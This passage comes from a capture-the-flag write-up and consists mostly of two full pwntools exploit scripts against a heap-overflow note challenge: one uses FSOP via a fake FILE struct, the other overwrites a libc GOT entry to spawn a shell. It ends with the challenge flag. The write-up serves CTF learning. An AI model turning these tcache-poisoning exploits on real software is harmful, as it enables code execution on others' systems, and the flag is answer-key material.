    delete(io, 0)

    overflow = b'A' * (0x10 + i * 0x20)
    overflow += p64(0x20) + p64(0x201)
    overflow += b'A' * 0x18
    overflow += p64(0x20d31 - i * 0x20)

    if i == 7:
        overflow += b'A' * 0x1d8
        overflow += p64(0x21) + b'A' * 0x18 + p64(0x21)

    create(io, 0, 4, overflow)
    delete(io, 1)
    delete(io, 0)

# ── Phase 2: Libc leak ──

create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - UNSORTED_FD
log.info(f'{hex(libc.address)=}')

# ── Phase 3: Heap leak ──

unsorted_fd = libc.address + UNSORTED_FD
delete(io, 0)
create(io, 0, 4,
    b'A' * 0xf8 + p64(0x21) +
    p64(unsorted_fd) * 2 +
    p64(0x20) + p64(0x20c50))

create(io, 1, 0xc, b'X')
delete(io, 1)
delete(io, 0)
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
log.info(f'{hex(mangler)=}')

delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21))

# ── Phase 4: Tcache poisoning → _IO_list_all + fake FILE ──

heap_base = mangler << 12
io_list_all = libc.sym['_IO_list_all']
io_wfile_jumps = libc.sym['_IO_wfile_jumps']

# Set up two 0x30 tcache entries for poisoning
delete(io, 0)
create(io, 0, 0x20, b'X' * 0x18)  # 0x30 chunk from top (heap+0x3B0)
create(io, 1, 0x20, b'Y' * 0x18)  # 0x30 chunk from top (heap+0x3E0)
delete(io, 1)  # tcache[0x30]: heap+0x3E0
delete(io, 0)  # tcache[0x30]: heap+0x3B0 → heap+0x3E0

# Build fake FILE struct
fake_file_addr = heap_base + 0x420
wide_data_addr = fake_file_addr + 0xe8
wide_vtable_addr = wide_data_addr + 0xe8

fp = FileStructure()
fp.flags = u64(b' sh\x00\x00\x00\x00\x00')
fp._IO_buf_base = 0
fp._lock = fake_file_addr + 0xe0
fp._wide_data = wide_data_addr
fp.vtable = io_wfile_jumps
mode_bytes = bytearray(48)
mode_bytes[0x18:0x1c] = p32(1)
fp.unknown2 = bytes(mode_bytes)

wide_data = flat({
    0x18: p64(0), 0x20: p64(1), 0x30: p64(0),
    0xe0: p64(wide_vtable_addr),
}, filler=b'\x00', length=0xe8)

wide_vtable = flat({
    0x68: p64(libc.sym['system']),
}, filler=b'\x00', length=0x70)

# Overflow: poison tcache + embed fake FILE structs
# note0's 0x30 chunk is at heap+0x3B0, note1's at heap+0x3E0
o2 = flat({
    0x110: p64(0) + p64(0x31),                                 # note0 chunk header
    0x120: p64(mangle(io_list_all, heap_base + 0x3C0)),         # poisoned fd
    0x140: p64(0) + p64(0x31),                                  # note1 chunk header
    0x150: p64(mangle(0, heap_base + 0x3F0)),                   # fd → NULL
    0x180: bytes(fp),                                            # fake FILE at heap+0x420
    0x268: wide_data,                                            # fake _wide_data
    0x350: wide_vtable,                                          # fake wide vtable
}, filler=b'\x00', length=0x3C0)

create(io, 0, 4, o2)

# ── Phase 5: Trigger FSOP ──

delete(io, 0)
create(io, 0, 0x20, b'Z' * 0x18)  # consume first tcache[0x30] entry

# Second malloc returns _IO_list_all, write fake_file_addr
# Pad to 0x18 bytes so read() doesn't consume the exit command
create(io, 1, 0x20, p64(fake_file_addr).ljust(0x18, b'\x00'))

# exit() → _IO_flush_all → FSOP → system(" sh")
io.sendlineafter(b'> ', b'4')
io.sendline(b'echo PWNED')
io.recvuntil(b'PWNED', timeout=3)
log.success('Got shell!')
io.sendline(b'cat /app/flag.txt')
io.interactive()
```

</details>

### libc GOT overwrite (intended)

The intended solution, much shorter since there's no FILE struct construction:

```python
from pwn import *

context.arch = 'amd64'
exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

UNSORTED_FD = 0x21ace0  # main_arena + 96 (unsorted bin fd)

mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def create(io, idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def delete(io, idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    return io.recvline(keepends=False)

io = remote('chall.lac.tf', 31144) if args.REMOTE else process([exe.path])

# ── Phase 1: Fill tcache[0x200] + push one to unsorted bin ──

for i in range(8):
    create(io, 0, 0xc, b'X')
    create(io, 1, 0xc, b'X')
    delete(io, 0)

    overflow = b'A' * (0x10 + i * 0x20)
    overflow += p64(0x20) + p64(0x201)
    overflow += b'A' * 0x18
    overflow += p64(0x20d31 - i * 0x20)

    if i == 7:
        overflow += b'A' * 0x1d8
        overflow += p64(0x21) + b'A' * 0x18 + p64(0x21)

    create(io, 0, 4, overflow)
    delete(io, 1)
    delete(io, 0)

# ── Phase 2: Libc leak ──

create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - UNSORTED_FD
log.info(f'{hex(libc.address)=}')

# ── Phase 3: Heap leak ──

unsorted_fd = libc.address + UNSORTED_FD
delete(io, 0)
create(io, 0, 4,
    b'A' * 0xf8 + p64(0x21) +
    p64(unsorted_fd) * 2 +
    p64(0x20) + p64(0x20c50))

create(io, 1, 0xc, b'X')
delete(io, 1)
delete(io, 0)
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
log.info(f'{hex(mangler)=}')

# Fix freed chunk header
delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21))

# ── Phase 4: Tcache poisoning → strlen GOT ──

delete(io, 0)
create(io, 0, 0x20, b'X' * 0x18)
create(io, 1, 0x20, b'Y' * 0x18)
delete(io, 1)
delete(io, 0)

# Overflow: poison tcache fd to point at libc's strlen GOT
strlen_got = libc.got['strncpy']  # strncpy and strlen GOT entries are adjacent
create(io, 0, 4,
    b'A' * 0x118 +
    p64(0x31) +
    p64(mangle(strlen_got, mangler << 12)) +
    b'\x00')  # null byte to pass tcache key check

# Consume poisoned tcache
create(io, 1, 0x20, b'/bin/sh\x00')  # first pop: normal chunk
delete(io, 0)
create(io, 0, 0x20,                   # second pop: libc GOT!
    p64(libc.sym['strncpy']) +         # preserve strncpy
    p64(libc.sym['system']))           # overwrite strlen -> system

# ── Trigger: puts("/bin/sh") → strlen → system ──
show(io, 1)
io.interactive()
```

---

## Flag

```
lactf{omg_arb_overflow_is_so_powerful}
```
